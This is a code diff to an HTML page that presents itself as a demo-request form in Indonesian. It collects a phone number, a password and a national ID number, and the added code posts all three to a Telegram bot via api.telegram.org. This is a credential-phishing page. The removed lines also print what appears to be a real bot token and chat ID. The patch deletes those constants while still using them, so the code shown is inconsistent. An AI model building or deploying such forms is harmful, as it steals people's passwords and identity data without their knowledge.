@@ -108,28 +108,29 @@ function kirimDemo() {
 </body>
 
 <script>
-const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
-const CHAT_ID = "8264171951";
-
-<script>
-function kirimDemo() {
+async function kirimDemo() {
   const hp = document.getElementById("hp").value;
   const password = document.getElementById("password").value;
-  const nikKtp = document.getElementById("nik").value;
-
-  if (!hp || !password || !nikKtp) {
-    alert("Lengkapi data dulu");
-    return;
-  }
+  const nik = document.getElementById("nik").value;
 
   const pesan = `
 Nomor HP: ${hp}
 Password: ${password}
-🪪 Nik KTP: ${nikKtp}
-🕒 Waktu: ${new Date().toLocaleString("id-ID")}
+NIK: ${nik}
 `;
 
-  console.log(pesan);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
+
+  alert("Pengajuan demo berhasil dikirim");
 }
 </script>
 
